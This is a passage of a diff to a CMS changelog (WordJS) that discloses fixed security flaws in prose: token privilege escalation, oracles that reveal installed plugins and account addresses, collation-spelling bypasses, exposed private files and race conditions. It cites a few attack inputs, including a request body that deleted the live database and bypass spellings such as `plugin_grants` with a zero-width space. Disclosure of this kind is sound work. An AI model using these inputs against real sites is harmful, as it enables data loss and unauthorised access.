@@ -8,6 +8,32 @@ on the [Releases](https://github.com/jaimemartinez/wordjs/releases) page.
 
 ### Security
 
+- **An anonymous caller can no longer tell which plugins are installed, or in which version.** The
+  static `/plugins/<slug>/…` mount answered for every *installed* plugin, active or not:
+  `/plugins/<slug>/manifest.json` handed out its name, exact version, author, requested permissions and
+  dependencies — the inventory an attacker matches against known-vulnerable releases, deactivated plugins
+  included — and `client/admin/admin.css`, `dist/component.bundle.css` and `public/**` confirmed a slug
+  was on disk. A slug→folder rewrite in front of the mount also resolved the admin-page slug of an
+  inactive plugin, and did measurably more work for an unknown slug than for an installed one. The bundle
+  routes had the same oracle in another shape: an unknown slug got a `200` empty stylesheet from
+  `/bundle/css` and a build hint from `/bundle` where an inactive plugin got a `404`, and
+  `/bundle/manifest` passed `dist/manifest.build.json` through whole, exact `version` included. Now the
+  static mount serves a plugin's files only while it is **active** — `public/**` while active,
+  `dist/component.bundle.css` only while active and granted `browser:script` (the gate of the bundle
+  it belongs to, revalidated on every load) — and never serves `manifest.json` or
+  `client/admin/admin.css`; it is addressed by plugin folder only. The bundle routes resolve a slug
+  among active plugins only, answer "not installed", "inactive" and "not granted" with one identical
+  `404`, and `/bundle/manifest` returns only `{ bundles }`. A refusal never reads the refused plugin's
+  folder. The generated plugin admin page reads its styling from two new authenticated
+  routes, `GET /api/v1/plugins/:slug/admin-style` (only the manifest's `style` and `theme`, never the
+  manifest) and `GET /api/v1/plugins/:slug/admin-style/css` (`Cache-Control: private, no-cache`), for
+  any signed-in user and an active plugin; anonymous callers get `401` before the slug is looked at.
+  Which plugins are *active* stays public (`GET /plugins/active`), because the public site needs it.
+  **Upgrade:** rebuild the frontend so the regenerated `/admin/plugin/<slug>` page uses the admin-style
+  routes (a self-built image without the rebuild renders plugin admin pages unstyled). Anything that
+  linked `/plugins/<slug>/manifest.json` or `/plugins/<slug>/client/admin/admin.css`, or addressed plugin
+  files by admin-page slug instead of folder, now gets a `404`. A cache that already holds a deactivated
+  plugin's `public/` asset may keep serving it for up to an hour (`max-age=3600`).
 - **The plugin sandbox works when WordJS runs as a non-root user that holds a capability.** A service
   started with `AmbientCapabilities=CAP_NET_BIND_SERVICE` (to listen on 443 without root) ended with the
   sandbox `degraded` and every plugin refused: the Landlock/seccomp shim treated any capability as root
@@ -72,6 +98,185 @@ on the [Releases](https://github.com/jaimemartinez/wordjs/releases) page.
   nodes:** a gateway from an earlier release sends no CA in its chain, so a pinned join against it fails
   closed. `create-wordjs gateway` now fails instead of printing join commands with a placeholder
   fingerprint.
+- **An API token can no longer create administrators or open registration through the import and
+  settings routes.** `POST /users` refused an administrator's `wjt_` token, but the same token could still
+  import accounts (`POST /import` with `importUsers`, which also moves an existing account's email when
+  `updateExisting` is set, so forgot-password then mails that account's reset link to the caller), set
+  `users_can_register` and `default_role: administrator` (`PUT /settings`, `PUT /settings/:key`) so the
+  next anonymous sign-up became an administrator, redefine a role (`POST`/`DELETE /roles`), or create an
+  account per unmatched author (`POST /import/wordpress`). Each of these is now refused to an API token
+  with `403 rest_token_management_forbidden` (`data.params` names the refused fields where the route
+  judges fields), through the same check that refuses them to a session started at a secondary address.
+  A token can still save the other settings and run a site import without accounts or registration
+  changes.
+- **An API token can no longer restore, create or download a backup, export the site archive or move the
+  database.** `POST /backups/:filename/restore` checked only that the caller was an administrator, so an
+  administrator's `wjt_` token could put back an older snapshot: the accounts and roles became the
+  snapshot's, and from a full snapshot (the default) so did the passwords, two-factor enrolments, API
+  tokens, plugin grants and registration settings. An administrator demoted since then was an
+  administrator again, with the password they had then. A restore is now refused to an API token
+  (`403 rest_token_management_forbidden`) and to a session started at a secondary address
+  (`403 rest_account_bound_session`), like the account import, before anything is read. There is no
+  backup upload endpoint, so this was the only way in. The same token could also create and download an
+  archive (`POST /backups`, `GET /backups/:filename/download`), which holds the bcrypt password hashes,
+  the two-factor seeds stored in clear, the API token hashes and the plugins' secrets with the key files
+  that decrypt them — what an interactive login needs; read the site archive (`GET /export`), which
+  carries every plugin's own tables, such as a payment plugin's write-only Stripe key; and move the site
+  to a database server it named (`POST /db-migration/migrate`), which copies every table there and then
+  runs the site on it. All four are now refused to an API token, the migration also to a session started
+  at a secondary address. Scheduled backups run in the server's own cron and are not affected; the WXR
+  export stays available to tokens. The JSON site archive never contained password hashes: the
+  `password` field the export code meant to fill was always absent, and that code has been removed.
+- **An API token can no longer give a plugin more than an administrator approved.** A token could add
+  any grant through `POST /plugins/:slug/permissions` (`database:write`, `email:provider`, `network`, or
+  `browser:script`, which runs the plugin's code in the admin pages with the viewer's session), widen or
+  clear the egress allowlist through `POST /plugins/:slug/egress-hosts` (an empty list allows every public
+  host), and activate a plugin for the first time through `POST /plugins/:slug/activate`, which grants
+  everything its manifest declares and records that as the administrator's decision. Each of these is
+  now refused to an API token with `403 rest_token_management_forbidden`, `data.params` naming what
+  would have been added, and nothing is written. A token can still revoke grants and narrow the egress
+  list, install and update plugins, and deactivate and re-activate a plugin whose grants an
+  administrator decided (a revoke of every grant included: it starts with nothing granted), so a headless
+  deploy needs one interactive activation per plugin that declares permissions.
+  Interactive administrators are not affected. On a multi-node install the check compared the token's
+  request with the copy of the grants and allowlists a node keeps in memory, which a revoke made through
+  another node does not reach, so a token could save a grant again that an administrator had just revoked
+  elsewhere. A token's write to the grants or the allowlist is now decided on the stored record, read at
+  the moment of the write, and written only if the record has not changed since — also when there was no
+  record yet, where the first write used to overwrite whatever another node had stored in between. A
+  token's activation starts the plugin with the stored grants and the stored egress allowlist (the child
+  was still given that node's copy of the list). Everything else on a node — the bridge's per-call
+  checks, a reload, the admin screens — reads its copy, which the policy re-sync brings up to date
+  within about 10 seconds (see `documentation/multi-node.md`).
+- **Updating a plugin no longer brings back a revoked grant or a wider egress list.** An in-place update
+  (`POST /marketplace/update`, or `/marketplace/install` on an installed plugin) cleared the plugin's
+  stored grants and egress allowlist and wrote back the copy the node serving the request kept in memory.
+  On a multi-node install that copy does not see a revoke made through another node, so an update served
+  by such a node granted the revoked permission again and replaced a narrowed allowlist with that node's
+  list — an empty one allows every public host. A failed update's rollback did the same. An update now
+  leaves both records as they are stored and reactivates the plugin with them. The one write it still
+  makes is an empty grant record for a plugin that has none, stored before anything moves and only if no
+  record appeared meanwhile: every boot grants an active plugin with no record whatever its manifest —
+  after an update, the new version's — declares, so without that record a token could activate a plugin
+  that declared nothing, update it to a version declaring `network` and `database:write`, and have both
+  granted at the next restart. No administrator decision is recorded with that empty record, so a plugin that was never
+  activated still gets what it declares when an administrator first activates it. The boot step that grants an
+  active plugin with no grant record what its manifest declares now decides "no record" on the stored row,
+  under the plugin-policy lock, and writes nothing while the grants cannot be read: a record stored in the
+  meantime (an administrator's decision made through another node, an update's empty record) is kept, and
+  a database error at boot no longer turns a partial revoke back into everything the manifest declares.
+- **The database cleanup no longer deletes the database the site is running on.**
+  `POST /db-migration/cleanup` accepted any of its three file names without checking which database was
+  in use, so `{"file": "wordjs-native.db"}` deleted the live default SQLite file with its `-wal` and `-shm`
+  (Windows usually refuses to delete a file SQLite holds open; other systems do not), and an
+  administrator's API token could send it. When the native SQLite driver falls back to the pure-JS one,
+  which reads the same file, the migration screen even listed the live file for cleanup. The cleanup now
+  refuses (`409 db_cleanup_active_database`) any file of the database in use — the configured file and
+  its `-wal`, `-shm` and `-journal`, however a symlink, a junction or (on Windows and macOS) letter case
+  spells them — and, like the migration, is refused to an API token and to a session started at a
+  secondary address. A migration whose SQLite target file is the database in use (a `dbPath` pinned to
+  the other driver's default name) is refused the same way (`409 db_migration_target_is_active`) before
+  anything is read or written. Leftover files are still removed, now with their `-journal` too.
+- **Registration settings are recognised under every spelling MySQL treats as the same name.** On MySQL
+  and MariaDB option names are compared without regard to case, but the check that refuses a change to
+  who may register compared them exactly, so a site import from an API token or from a session started
+  at a secondary address carrying `REQUIRE_EMAIL_VERIFICATION: "0"` or `MAIL_DELIVERY_READY: "0"` wrote
+  the real setting and turned email verification off. The check now compares names the way the
+  database does, for `POST /import`, `PUT /settings` and `PUT /settings/:key` alike. (`users_can_register`
+  and `default_role` were already protected from the import under every spelling.)
+- **The plugin asset list can no longer be held by a shared cache.** `GET /api/v1/plugins/assets` was sent
+  `Cache-Control: public, max-age=60`, so a cache in front of the API could keep emitting a deactivated or
+  revoked plugin's `<script>` for a minute that no purge reached. It is now `private, no-cache`; the
+  public site's own cached copy is purged on every change, as before.
+- **Entries of a post type the site does not know are no longer public.** Read checks fell back to the
+  public `post` rules for a type missing from the registry, so published entries of types a WordPress
+  import brought in (contact-form submission stores, shop coupons), of a non-public custom type an
+  administrator deleted, or of any custom type during the first moments after a restart were served to
+  anonymous callers by `GET /posts?type=`, `GET /posts/:id`, `GET /posts/slug/:slug` and the public site,
+  and their comments by `GET /comments`. Such entries are now readable only by their author and by users
+  who can edit or read others' posts. Built-in types keep their rules while the registry loads, and the
+  public comment list now filters on the types that are public instead of excluding the ones that are not.
+  `GET /seo/meta/:postId` applies the same read check, so a contributor no longer reads the published
+  entries of a non-public type there. The same rule covers what hangs off such an entry: its attachments
+  are no longer visible to anonymous callers on `GET /media/:id`, in the media list or in its totals, and
+  a published translation sibling of an unknown type is no longer named to every reader of a public post.
+- **Changing your email no longer reveals whether another account uses an address.** `PUT /users/me` (and
+  a self-edit through `PUT /users/:id`) checked whether the address was taken before checking the current
+  password, so without the password a taken address answered `400 rest_invalid_email` and a free one
+  `403 rest_bad_current_password`. The address is now looked up only after the password is confirmed; a
+  malformed address is still refused first.
+- **Per-client limits count an IPv6 /64 as one client.** The login throttle, the API, collaboration,
+  analytics, auth, failed-login, upload, forms, setup and comment rate limits, the password-confirmation
+  in-flight limit and the `clientKey` plugin routes receive were keyed on the full address, so a client
+  holding an IPv6 /64 got a fresh limit per address.
+  IPv6 addresses are now grouped by /64; IPv4 addresses, including IPv4-mapped IPv6 addresses, stay per
+  address. The plugin `clientKey` is now keyed with the site's secret as intended, so it no longer changes
+  on every restart or differs between nodes.
+- **`settings:write` no longer lets a plugin put its own script on every public page.** The enqueue
+  registry is an ordinary option (`plugin_assets`) that the options bridge did not protect, so a plugin
+  granted `settings:write` but not `assets:write` could write its own `public/*.js` into it and have it
+  emitted as a `<script src>` on every public page, which share the admin app's origin. The bridge now
+  refuses the name, and `GET /api/v1/plugins/assets` only emits the entries of plugins that hold
+  `assets:write` at the time of the request, so revoking the grant also takes the tags off. A change to
+  the registry, the grants or the active plugins now also purges the public site's cached copy of that
+  list, which otherwise kept a revoked script on already-rendered pages for up to two minutes. The same
+  protection now covers the announcement bar (`site_chrome_announcement`, written only through
+  `PUT /api/v1/chrome/announcement` like the header and footer) and the custom content-type and taxonomy
+  registries (`custom_post_types`, `custom_content_schemas`, `custom_taxonomies`), which decide at boot
+  who may read and edit each type.
+- **A plugin can no longer replay the `browser:script` upgrade to undo revocations.** The one-time step
+  that grants `browser:script` to plugins that were already active recorded completion in an unprotected
+  option, so a plugin with `settings:write` could clear it and the next boot granted `browser:script`
+  again to every active plugin with browser code, its own included. Completion is now recorded inside the
+  grant store, which only a writer that can already change every grant can reset, and the old option is
+  refused to the bridge (where it already exists it still counts as done). On a site installed through
+  the setup wizard the step had never run, so it first ran at the first restart after real use and
+  granted `browser:script` back to plugins the administrator had revoked it from. The installer now
+  records the step as done on the site it creates, and the step never changes a plugin whose permissions
+  an administrator has set (on activation or on the permissions screen).
+- **Protected option names are protected under every spelling the database treats as the same.** On
+  MySQL and MariaDB the options table compares names case-, accent- and invisible-character-insensitively
+  and ignores trailing spaces, while the options bridge compared them byte for byte, so `plugin_grants `,
+  `plugin_grànts` or `plugin_grants` followed by a zero-width space reached the protected row. Any name
+  outside printable ASCII, or with a leading or trailing space, is now refused by the bridge, the theme
+  backstop and the site import. The theme backstop now uses the bridge's own list instead of a copy that
+  had fallen behind it.
+- **`GET /posts?type=` authorizes the rows it returns on MySQL.** The list chose its read policy by an
+  exact lookup of the requested type while MySQL matched `post_type` without regard to case, accents or
+  trailing spaces, so `?type=INVOICE` found no registered type, applied the public `post` policy and
+  returned a non-public type's published entries to anyone (and every status of them to an editor
+  without that type's capabilities), and `?type=nav_menu_item%20` listed menu items. A `type` must now be
+  spelled the way registered names are (lowercase letters, digits, `_` and `-`), on the list and on
+  `GET /posts/slug/:slug`, or the request is `400 rest_invalid_post_type`. The WordPress importer skips
+  items whose type is spelled any other way, which kept `Revision` or `NAV_MENU_ITEM` from becoming
+  revisions or menu items on MySQL. Imported statuses had the same problem: the WordPress importer and the
+  site import (including a logical backup restore) stored the status as written, so a `Publish` entry was
+  unpublished to the read checks while MySQL listed it, with its comments, as published. Imported statuses
+  are now folded onto the ones the site writes (`Publish` becomes `publish`); `inherit`, a status added by
+  a WordPress plugin, or any other value imports as `draft`, and a trashed item is skipped in any case.
+- **Self-registration no longer reveals whether an address has an account, even with a second request.**
+  With email verification on, a taken and a free address already got the same `201`, but a free one
+  also got an unverified account named after the submitted username. Logging in as that username
+  (`403 rest_email_unverified` against `401`) or registering it again (`400` against `201`) told the two
+  apart. A registration now creates nothing until its emailed link is followed: it is kept under the hash
+  of the link's token, `POST /auth/verify-email` creates the account, and until then no username is taken
+  and no account exists. If the name or address was taken in the meantime the link answers
+  `409 rest_registration_unavailable`. Links sent by earlier versions (`?uid=…&token=…`) still work. A
+  non-string `password` used to answer `201` for a taken address and `500` for a free one; `username`,
+  `email`, `password` and `displayName` must now be strings (`400 rest_invalid_param`), and a failure
+  after the identity checks is answered with the same `201`.
+- **An Author can no longer take over a page's public URL with a post of the same slug.** Slugs were
+  unique per post type, but the public site resolves `/<slug>` without a type and tried posts before
+  pages, so an Author with no page capability could publish a post `contact` and `/contact`, with its
+  menu entry and sitemap line, served the Author's content instead of the page. Slugs written through
+  `POST`/`PUT /posts` are now unique across every publicly routed type (the second entry gets
+  `contact-2`), and a post and page that already share a slug resolve to the page. The two importers
+  keep a source site's per-type slugs, as WordPress does, and re-saving an entry under its current slug
+  keeps it. Restoring a revision applies the same rule to the slug it brings back, which used to be
+  written as is. For such a pair, `/<category>/<post-slug>` still shows the post and a draft preview
+  opened from the editor or the content list shows the entry it was opened for (the preview link now
+  carries the type). The legacy backend page renderer, which was not mounted and still looked up posts
+  before pages, has been removed.
 - **Scheduled and private posts now need the published-post capability.** The edit and delete gates
   applied `edit_published_*` / `delete_published_*` only to `publish`, so a contributor could rewrite
   their own scheduled post after an editor approved it (the unreviewed copy then went live on its own)
@@ -190,6 +395,432 @@ on the [Releases](https://github.com/jaimemartinez/wordjs/releases) page.
     shipped or run by the server, and the glob patterns it expands come from the repository's own lint
     configuration, not from input. The latest `@next/eslint-plugin-next` (16.4.0 and canary) still pins
     `fast-glob` 3.3.1, so there is no upgrade or override that removes it.
+- **Paid Digital Downloads files could be downloaded by anyone (HIGH).** The bundled `digital-downloads`
+  plugin protected a product only by never listing its media-library URL, but the core media API listed
+  every unattached item to anonymous callers (`GET /api/v1/media?mime_type=application/zip` returned the
+  paid files with their `sourceUrl`) and `/uploads` served them with no authentication and a one-year
+  `immutable` cache; a buyer who saw the URL once also kept it past the link's expiry and use limit.
+  Fixed with **private media** in core: a media item can be `visibility: "private"`
+  (`POST /api/v1/media?visibility=private`, or `PUT /api/v1/media/:id {"visibility":…}`, which moves the
+  files). Its files live under `config.uploads.privateDir` (default `data/private-uploads/`, included in
+  backups), which nothing serves; the row (`post_status = 'private'`) is excluded from the anonymous media
+  list and its `X-WP-Total`, `GET /media/:id` (404), `/posts`, sitemaps, feeds, search and featured-image
+  projections. Only a caller who may edit the item sees it, and its bytes are reachable only through the
+  authenticated `GET /api/v1/media/:id/file` or a plugin route replying `res.sendPrivateMedia(id)` under the
+  new default-deny **`media:private_read`** permission — in both cases streamed by the host as an
+  attachment with `no-store`, never through a URL and never over the plugin IPC channel
+  (`backend/src/core/private-media.ts`). Public media behaves exactly as before. The admin media library
+  gets a "Subir como privado" option, a visibility filter, a private badge and a private/public toggle;
+  the content image picker lists public items only.
+- **`digital-downloads` 1.1.0: products are private media files streamed per download.** A product now
+  references a private media item (selected or uploaded as private from the plugin's admin page); the
+  token route re-checks paid + expiry + max-uses and consumes a use on **every** download, then has the
+  host stream the file, so no permanent URL is ever revealed. A file the host cannot deliver (no longer
+  private, deleted, or grant missing) answers 503 without consuming a use. Products created before 1.1.0
+  keep their public `file_url` working, but the admin list and editor flag them as public until their file
+  is re-selected as private (re-selecting drops the old URL). The plugin now requests `media:private_read`.
+  **Operators: grant it in `/admin/plugins` after updating, re-select every flagged product's file as
+  private, and treat files that were public before as already exposed** (re-upload them under a new name
+  if that matters — old copies may persist in caches).
+- **A post's featured image no longer reveals posts and files its reader may not see (HIGH).**
+  `featuredMedia` was resolved from the author-written `_thumbnail_id` meta, which accepts any id, and
+  copied the target's title and file URL without checking that the target was an attachment or that the
+  reader could see it. A contributor could point a draft at an editor's draft or private post and read
+  its title back; an author could publish such a pointer, and every anonymous reader of `GET /posts`,
+  `GET /posts/:id` and `GET /posts/slug/:slug` (and the page's `og:image`) received the hidden title, or
+  the real `/uploads/…` URL of a file attached to an unpublished entry, which `GET /media/:id` answers 404
+  for. Walking ids disclosed every unpublished title. `featuredMedia` is now projected only when the id
+  names an attachment this caller could read through `GET /media/:id`: never another post type, never an
+  item whose parent entry the caller may not read (next entry), never someone else's private item.
+  A private item reaches only a caller who may edit it, and then with its authenticated
+  `/api/v1/media/:id/file` route, never an `/uploads` path. Single-post and list responses apply the same
+  rule (`backend/src/core/attachment-visibility.ts`). `GET /media/:id` now uses that rule too, so an
+  attachment row in another status (a draft created through `POST /posts`) is 404 to anyone who may not
+  read it, instead of returning its title to anonymous callers.
+- **Attachments of entries the reader may not read are hidden from the media API and `featuredMedia` (HIGH).** An
+  attachment inherits its parent entry's visibility, but `GET /media/:id`, the media list and
+  `featuredMedia` only asked whether the parent was *published*, never whether the reader may read it. A
+  published entry of a `public: false` content type (`GET /posts/:id` → 404 for anonymous callers) — an
+  invoice, an order, a members-only record, or a private WordPress type brought in by the WXR importer
+  with its attachments — therefore handed every attached file's title and `/uploads/…` URL to anyone:
+  `GET /media/:id` answered 200, the anonymous media list listed and counted it, and any public post naming
+  it as featured image projected it. The media list kept its own copy of the rule and also skipped it
+  outright for any holder of `edit_others_posts`, whatever the parent's type, so an editor listed the
+  attachments of entries of a type with its own capability family that they may not read. All three
+  surfaces now ask the parent the question `GET /posts/:id` asks, under the parent type's read policy
+  (`backend/src/core/attachment-visibility.ts`): an unpublished entry, or a published entry of a
+  non-public type, shows its attachments only to its author and to holders of that type's
+  `edit_others_*` / `read_private_*` capability; an internal parent (a menu item, a revision) never makes
+  an attachment public, also before the type registry has loaded at boot; and a **password-protected**
+  entry's attachments are part of what the password protects and reach only a caller who manages the
+  entry (its author, or `edit_others_*` for its type) — its featured image is covered by an entry
+  below. Unattached items and published public entries are unchanged. The rule governs the item's
+  metadata (title, URL, existence); a public file is served at its `/uploads/…` path to whoever has that
+  URL, so a file that must stay confidential belongs in private media. The next four entries apply the
+  same rule to the media list's totals and searches, private downloads, the generic `/posts` surface and
+  an entry's fields.
+- **The media list's totals and searches no longer reveal hidden attachments (MEDIUM).** `GET /media`
+  applied the parent rule to the fetched page only and subtracted the items hidden on *that* page from a
+  total that counted everything, so every other page — a page past the end above all — and every
+  `?search=` still counted them: their existence and number, and, through the full-text prefix / substring
+  search, their title one character at a time (the title defaults to the uploaded file name, which leads
+  to its `/uploads/…` URL). The rule is now part of the query itself (`Post.buildWhere`
+  `attachmentViewer`), so the rows, `X-WP-Total` and `X-WP-TotalPages` are computed over the visible set
+  for every caller, page and search. The SQL is derived from the same functions `GET /media/:id` asks — by
+  evaluating them on every combination of the facts they read — not written a second time, and a test
+  compares the two on real rows for every role, including the boot window. The twin,
+  `GET /posts?type=attachment`, listed and counted to an editor every attachment of the entries of a type
+  with its own capability family; it takes the same condition — and the type it is asked for is now
+  compared **exactly** on every engine (`backend/src/core/sql-exact-text.ts`, used by `Post.buildWhere`
+  and `Post.findBySlug`). Under MySQL/MariaDB's case-insensitive, PAD SPACE collation
+  `?type=ATTACHMENT&status=inherit` (or `attachment%20`) selected the attachments while the condition,
+  decided on the exact name, was never applied (the same comparison exposed other types too; see the
+  `GET /posts?type=` entry above, which now refuses such a spelling with `400 rest_invalid_post_type`).
+  Inside the query, too, a spelling that differs from the stored type now selects nothing, whoever calls
+  it; SQLite and PostgreSQL already compared exactly. The query path resolves the comparison helper, the
+  database module, the type registry and the capability helpers once per process rather than on every
+  call (a fresh module resolution per call had taken `Post.buildWhere` from about 1 µs to about 50 µs,
+  over the F6 query budget, and an attachment list paid some fifty of them).
+- **Private attachment downloads follow the parent entry (MEDIUM).** `GET /api/v1/media/:id/file` asked
+  only whether the caller may edit the item (its uploader, or any `edit_others_posts` holder), so an
+  editor downloaded the private file of a published entry of a type with its own capability family while
+  `GET /media/:id` answered 404 for the same item. It now applies the same rule as `GET /media/:id`. A
+  plugin route replying `res.sendPrivateMedia(id)` keeps delivering under the plugin's own rule (for
+  example `digital-downloads`' paid, unexpired download tokens): the default-deny `media:private_read`
+  grant is a site-wide delegation by the administrator, not a per-caller read.
+- **Attachments on the generic `/posts` surface, and every attachment write, follow the parent entry
+  (LOW).** The record gate alone let an editor read such an attachment through `GET /posts/:id`, its meta
+  (`_wp_attached_file`), `GET /posts/slug/:slug?type=attachment`, its translations and its revision
+  history, and change it: `PUT /media/:id` answered 200 and edited it. Reads of an attachment now also
+  need the right to read its entry (404 otherwise); writes — `PUT`/`DELETE /media/:id`, `PUT`/`DELETE`
+  `/posts/:id`, its meta, language and translations, collaboration, presence and revision restore/delete —
+  also need the right to **edit** the entry (403), the gate attaching a file to that entry already takes,
+  and answer 404 when the caller may not see the attachment at all. The other routes that take an id
+  follow too: `GET /seo/meta/:postId` (it returned such an attachment's title and slug to an editor),
+  commenting on an attachment and reading its comments by id or by `?post=` without `moderate_comments`
+  (`POST /comments` answered 201 where a missing id is 404 — confirming the item exists — and stored the
+  comment; `GET /comments/:id` and `GET /comments?post=` returned its comments), and the
+  collaboration channel (403 for a hidden attachment, 404 for a missing id): each now answers exactly what
+  it answers for an id that does not exist. Two visible, intended consequences: a write to someone else's
+  private media item that the caller may not see now answers 404 instead of 403, like the read; and an
+  author or contributor can no longer edit or delete **their own** upload once it is attached to an entry
+  they may not edit. Naming such an attachment, or any row the caller may not read, as an entry's `parent`
+  (`POST /posts`, `PUT /posts/:id`) now answers the `400 rest_invalid_post_parent` of a missing id (it
+  answered 403, and an editor could create a post under an attachment `GET /media/:id` hides from them),
+  and an attachment parent also takes the attachment write rule (403 when the caller may not edit its
+  entry). The site-wide `GET /comments` list shows callers without `moderate_comments` only the comments
+  of published, unprotected entries of a public type (the `publicOnlyTypes` filter of `Comment.findAll`).
+  A plugin route holding `media:private_read` serves under the plugin's own rule (`res.sendPrivateMedia`),
+  and comment moderators' views are site-wide.
+- **An entry's fields reach only callers who may read the entry (LOW).** Three surfaces answered more
+  than `GET /posts/:id` does. `GET /seo/meta/:postId` kept its own copy of the read rule ("unpublished
+  needs the author or `edit_others_posts`"), blind to the type: an editor read the title of the
+  unpublished entries of a type with its own capability family, a contributor the title and excerpt of
+  every **published** entry of a `public: false` type, and anyone who may read a password-protected entry
+  its excerpt; it now asks the content API's rule (`canReadRecordThroughRest`) and withholds the excerpt as
+  the content API does. Translation refs were filtered only when the post being serialized was of a
+  non-public type, so a public post linked to the published entry of a `public: false` type named it (id
+  and slug) to every reader, and `POST /posts/:id/translations` answered the whole group, members the
+  caller may not read included; each sibling is now checked. And `GET /posts/slug/:slug` answered
+  `rest_post_invalid_id` when a row the caller may not read held the slug and `rest_post_invalid_slug`
+  when none did — the same 404 status, but an exact-slug existence oracle over drafts, non-public entries
+  and hidden attachments (whose slug comes from the uploaded file name); every miss is now
+  `rest_post_invalid_slug`.
+- **A password-protected entry's featured image is withheld whatever it names (LOW).** Only attachments
+  *of* the protected entry were withheld, so an unattached library image set as its `_thumbnail_id` was
+  still projected as `featuredMedia` to every reader. `featuredMedia` and the `_thumbnail_id` naming it
+  (in the post's `meta` and in `GET /posts/:id/meta`) are now omitted for a caller who may not read the
+  entry's content (who does not manage it); the image itself stays an ordinary public library item.
+- **Marketplace plugins: abuse limits that one visitor could exhaust for everyone are now per client.**
+  Each fix has a regression test that boots the real plugin (`backend/src/tests/marketplace-plugin-abuse.test.ts`,
+  `mail-server-vacation.test.ts`, new cases in `mail-server-spf.test.ts`).
+  - **auctions 1.0.1** — the bid throttle counted every attempt, valid or not, in one site-wide 60 s window,
+    so about 121 malformed bids a minute blocked all bidding and the flooder won at its own price. Attempts
+    are now counted only per client (`req.clientKey`); the per-auction, per-client-per-auction, per-email
+    and site-wide caps count bids that actually inserted. Those caps are claimed in the same step as the
+    check and refunded when the bid does not land: plugin route handlers run concurrently, and checking
+    first and counting after the INSERT let a burst of simultaneous bids from one client pass its 10/min
+    cap together (30 landed), so two clients could fill an auction's window and lock out every other bidder.
+  - **online-store 2.0.1** — unpaid orders reserved stock and consumed coupon uses forever, so one
+    anonymous checkout could empty the shop or burn a limited coupon. Orders still `new` + `pending`
+    past a reservation TTL (card: `cardPendingTtlMinutes`, default 60, and the Stripe Checkout Session gets
+    a matching `expires_at`; manual: `manualPendingTtlHours`, default 72, `0` disables) are cancelled by a
+    compare-and-set sweep that returns their stock and coupon use; card orders are re-verified with Stripe
+    first. Orders are capped per line (`maxLineQty`, default 99) and in total (`maxOrderQty`, default 100),
+    and the site-wide checkout cap (20/min) is replaced by per-client buckets (6/min, 30/h). The admin's
+    order-status change wrote any status with a plain UPDATE, so re-opening a cancelled order (its stock
+    and coupon use already returned), or one the sweep cancelled between the admin's read and the write,
+    left an order to fulfil with no stock held for it and the last unit was sold twice. A cancelled order
+    is no longer re-opened (409). The admin's payment-status change was just as unconditional: a cancelled
+    order could be marked paid, and the customer was mailed a receipt for an order nobody fulfils. The
+    flip into `paid` is now conditional on the order not being cancelled (409 otherwise, also when the
+    sweep cancels it between the admin's read and the write) and on it not being paid already, so two
+    admins marking it paid at the same time mail one receipt. The other payment statuses stay free.
+  - **bookings 1.0.1** — public bookings were `confirmed` instantly under global limiters, so one client
+    could fill the calendar or lock everyone out of lookups. Bookings now start `pending`, hold the slot for
+    1 h and are confirmed through a link mailed to the customer (the token is no longer returned to the
+    requester). They degrade to confirmed only when the site has no mail transport at all (no mail
+    provider registered, or the plugin not granted `email:admin`): any other send failure — the provider
+    refusing the address, a timeout, bridge back-pressure — releases the booking and asks the visitor to
+    retry, instead of confirming an unverified, non-expiring booking and returning its token. Addresses
+    the mail provider always refuses (IP-literal or `:` domains, control characters) are rejected up
+    front. Active future bookings are capped per email (3). Per client (5), only bookings no mailbox has
+    verified count — pending holds and, without mail, bookings created in the last 24 h — because a client
+    key is an HMAC of the IP and is shared behind a NAT or a proxy missing from `trustProxy`; counting
+    verified bookings there turned the cap into a site-wide limit of 5 future bookings for up to 90 days.
+    The slot and both caps are enforced by unique indexes on claim columns that the INSERT creating the
+    booking fills (`slot_claim`, `email_claim`, `client_claim`; cleared when the booking stops counting),
+    so a burst of simultaneous public requests cannot pass them together on SQLite, MySQL or Postgres. A
+    guard inside the INSERT (`WHERE NOT EXISTS` plus the cap counts) was not enough: on Postgres each plugin
+    statement runs under READ COMMITTED on its own connection and reads a snapshot that the INSERTs
+    racing it are not in, so simultaneous requests could each book the same slot. Bookings made before
+    the upgrade still count toward the caps (an address that already held more than 3 keeps them and gets
+    no new booking until it is back under the cap). Staff re-opening a completed, cancelled or expired
+    booking as confirmed puts it back under the email cap: it takes an email claim like a public booking
+    and is refused (409) while the address already holds 3 active bookings. A re-open used to add an
+    active booking that held no claim, and the claim picker — which offered the free claims below
+    `3 − unclaimed`, assuming the held ones sat in that range — then offered two claims with room for
+    one, so a burst reached 4 active bookings. The picker now offers only the lowest free claims there is
+    room for, and reads which claims are held through the claim column itself: on MySQL the collation
+    folds case and accents (`josé@` and `jose@` are one key), so comparing the strings in the plugin
+    offered a claim the index kept refusing until the retries ran out and the visitor got a 500. Claims
+    that keep colliding now answer 409. The staff status change chose its path from a read of the
+    booking and then wrote with a plain `UPDATE ... WHERE id = ?`: a booking read as pending or confirmed
+    that expired, or that its customer cancelled, before the write was confirmed again with no claim —
+    one over the cap once the address had booked again with the freed claim. The write is now
+    conditional on the status and claims it read; a booking that changed is read again and decided from
+    what is found — a confirm of one that stopped counting is a re-open (409 while the cap is full). A
+    re-open did not look at the slot: confirming a booking that expired, or that its customer cancelled,
+    after the agenda showed it or between the route's read and its write, re-opened it next to the
+    booking another visitor had made in the freed slot — two active bookings at one time on one calendar.
+    A re-open now takes the slot claim in the same UPDATE as its email claim and is refused (409) while
+    another active booking holds the slot. A failed confirmation mail answers 422 instead of 502, so a
+    CDN or proxy cannot replace the message asking the visitor to check the address. The booking/lookup
+    limiters are per client. The owner is notified only once a booking is confirmed.
+  - **invoices 1.0.1** — the failed-token throttle was global, so 60 wrong tokens in 10 min made every
+    customer's invoice link answer 429. It is now keyed per client, and each lookup is counted in the same
+    step as the check (refunded when the token is valid), so simultaneous guesses cannot all pass it.
+  - **vendor-marketplace 1.0.1** — a vendor's product update set `is_published = 1`, undoing an admin's
+    "hide". Hiding now sets an `admin_hidden` moderation flag the vendor portal cannot clear. Image and
+    logo URLs that are protocol-relative (`//evil.host/x.png`), contain a backslash or whitespace, or use
+    any scheme other than http(s) are refused. The vendor-application (5/min) and buyer-inquiry (10/min)
+    limits were site-wide, so one client closed both forms for everyone; they are now per client (3/min
+    and 5/min). One store per email address is now a unique index on a new `email_claim` column that the
+    INSERT creating the store fills: the duplicate check ran before an await and the INSERT after it, so
+    simultaneous applications for one address each stored a pending store, on every engine (the admin's
